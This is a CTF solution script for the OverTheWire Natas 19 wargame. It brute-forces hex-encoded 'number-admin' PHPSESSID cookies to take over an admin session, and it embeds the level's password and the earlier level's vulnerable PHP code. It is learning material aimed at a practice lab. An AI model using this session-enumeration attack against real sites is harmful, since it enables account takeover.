from requests import get
from requests.auth import HTTPBasicAuth
from time import sleep
from bs4 import BeautifulSoup
import binascii

#The script makes the first request to natas19.natas.labs.overthewire.org, using username and password;
#
#
#It loops from 0 to MAX_PHPSSID (in this case 640), 
#   for each loop it
#       - makes the request using the Auth field and the PHPSSID_cookie
#       - looks for "you're an admin" in the response body
#       -   in this case break
#       -   
#Print the response of the last
######
### In this case the phpsessid was the string "[num]-[user]" coded in hex.
### Winning string: '281-admin'
#####

link= 'http://natas19.natas.labs.overthewire.org?debug=1'

for cookie_payload in range(0,641):
    cookie_tostring=str(cookie_payload)
    cookie_payload = binascii.hexlify(bytes(str(cookie_payload), encoding="ascii"))
    cookie_jar = {'PHPSESSID':str(cookie_payload,'ascii')+'2d61646d696e'}
    print('Requesting with PHPSESSID: '+cookie_tostring+'-admin')
    req = get(link, cookies=cookie_jar, auth=HTTPBasicAuth('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'))
    if(req.status_code==200):
        soup = BeautifulSoup(req.text, 'html.parser')
        if 'You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.' in req.text:
            print('Cookie '+str(cookie_payload)+' is not a valid Admin Session')
        elif 'You are an admin. The credentials for the next level are' in req.text:
            print('Cookie '+str(cookie_payload)+' is a valid Admin Session!')
            print(soup.prettify())
            exit(0)
        else:
            print('####### Generic Error #######')
            print(soup.prettify())
            exit(1)
    else:
        print('######## HTTP ERROR: '+str(req.status_code)+'########\nRetrying...')
        exit(1)



'''

Code for natas18
$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() {
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}

function isValidID($id) {
    return is_numeric($id);
}
function createID($user) {
    global $maxid;
    return rand(1, $maxid);
}
function debug($msg) {
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
function my_session_start() {
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
function print_credentials() { 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
} 

if($showform) {
?> '''
